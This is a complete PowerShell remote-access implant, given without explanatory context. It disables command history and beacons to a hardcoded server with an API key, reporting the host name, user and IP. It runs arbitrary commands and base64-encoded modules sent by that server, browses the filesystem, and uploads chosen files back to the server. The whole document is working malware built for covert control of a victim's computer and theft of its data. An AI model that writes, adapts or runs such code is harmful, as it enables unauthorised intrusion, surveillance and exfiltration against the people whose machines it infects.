Clear-Host
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Set-Location -Path $env:USERPROFILE

$server_url          = "https://vnxor.com"
$api_key             = "gY8KsXhami4pk6t9ObW2VZLAJzGToeDRqfQInSuU"
$session_id         = $env:COMPUTERNAME
$heartbeat_interval  = 30
$poll_interval       = 0
$longpoll_timeout    = 20
$Global:ProgressPreference = 'SilentlyContinue'

#region NET
$headers  = @{ "X-API-Key" = $api_key }
$VSH_Jobs = @{}

function VPost([string]$url, [string]$body) {
    try {
        return Invoke-RestMethod -Method Post -Uri $url -Body $body `
            -ContentType "application/json; charset=utf-8" -Headers $headers
    } catch { return $null }
}

function VGet([string]$url) {
    try {
        return Invoke-RestMethod -Uri $url -Headers $headers -TimeoutSec 25
    } catch { return $null }
}
#endregion

#region HB
function VHeartbeat {
    $ip = try { (Invoke-RestMethod "ident.me" -TimeoutSec 3) } catch { "N/A" }
    VPost ($server_url + "/api.php?action=heartbeat") `
        (@{session_id=$session_id; ip=$ip; path=(Get-Location).Path; user=$env:USERNAME} | ConvertTo-Json)
}

function VSendResult([int]$id, [string]$output) {
    VPost ($server_url + "/api.php?action=result") `
        (@{command_id=$id; session_id=$session_id; output=$output; path=(Get-Location).Path} | ConvertTo-Json)
}
#endregion

#region MOD
function VRunModule($cmd) {
    $obj  = $cmd | ConvertFrom-Json
    $name = $obj.name
    $code = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($obj.code_b64))
    $isBg = [bool]$obj.is_background
    if ($isBg) {
        if ($VSH_Jobs.ContainsKey($name)) { return "[!] $name already running" }
        $job = Start-Job -ScriptBlock ([scriptblock]::Create($code)) -ArgumentList $server_url, $api_key, $session_id
        $VSH_Jobs[$name] = $job
        return "[+] $name started (job $($job.Id))"
    } else {
        try   { return (& ([scriptblock]::Create($code)) | Out-String) }
        catch { return $_.Exception.Message }
    }
}

function VStopModule([string]$name) {
    if ($VSH_Jobs.ContainsKey($name)) {
        $j = $VSH_Jobs[$name]
        $VSH_Jobs.Remove($name)
        try {
            $f = 'ParentProcessId=' + $PID
            Get-CimInstance Win32_Process -Filter ('Name=''ffmpeg.exe'' AND ' + $f) -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
            Get-CimInstance Win32_Process -Filter ('Name=''curl.exe'' AND ' + $f) -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        } catch {}
        Stop-Job   $j -ErrorAction SilentlyContinue
        Remove-Job $j -Force -ErrorAction SilentlyContinue
        return "[-] $name stopped"
    }
    return "[!] $name not running"
}
#endregion

#region LOOP
function MainLoop {
    $hb_at = [DateTime]::MinValue
    while ($true) {
        try {
            if (((Get-Date) - $hb_at).TotalSeconds -ge $heartbeat_interval) {
                VHeartbeat
                $hb_at = Get-Date
            }
            $r = VGet ($server_url + "/api.php?action=poll&session_id=" + [Uri]::EscapeDataString($session_id) + "&lp=1&lp_timeout=" + $longpoll_timeout)
            if ($null -ne $r) {
                $out = switch ($r.type) {
                    "exec"       { try { & ([scriptblock]::Create($r.cmd)) | Out-String } catch { $_.Exception.Message } }
                    "vmod"       { VRunModule $r.cmd }
                    "vmod_stop"  { VStopModule $r.cmd }
                    "cd"         { try { Set-Location $r.cmd; (Get-Location).Path } catch { $_.Exception.Message } }
                    "module"     { try { & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($r.cmd)))) | Out-String } catch { $_.Exception.Message } }
                    "filebrowse" {
                        $fbPath = if ($r.cmd -and $r.cmd -ne "") { $r.cmd } else { (Get-Location).Path }
                        try {
                            $fbItems = Get-ChildItem -Path $fbPath -ErrorAction Stop | ForEach-Object {
                                [ordered]@{ n=$_.Name; d=$_.PSIsContainer; s=if($_.PSIsContainer){0}else{$_.Length}; m=$_.LastWriteTime.ToString("yyyy-MM-dd HH:mm"); f=$_.FullName }
                            }
                            [ordered]@{ path=$fbPath; parent=(Split-Path $fbPath -Parent); items=@($fbItems) } | ConvertTo-Json -Depth 3 -Compress
                        } catch {
                            "{`"error`":`"$($_.Exception.Message.Replace('"',''))`"}"
                        }
                    }
                    "fetch_file" {
                        $fp = $r.cmd
                        if (Test-Path $fp -PathType Leaf) {
                            curl.exe -s -F "file=@`"$fp`"" -F "session_id=$session_id" -H "X-API-Key: $api_key" "$server_url/api.php?action=upload"
                        } else { "not found: $fp" }
                    }
                    default { "" }
                }
                VSendResult $r.id $out
            }
        } catch {
            Start-Sleep 10
        }
    }
}
#endregion
MainLoop
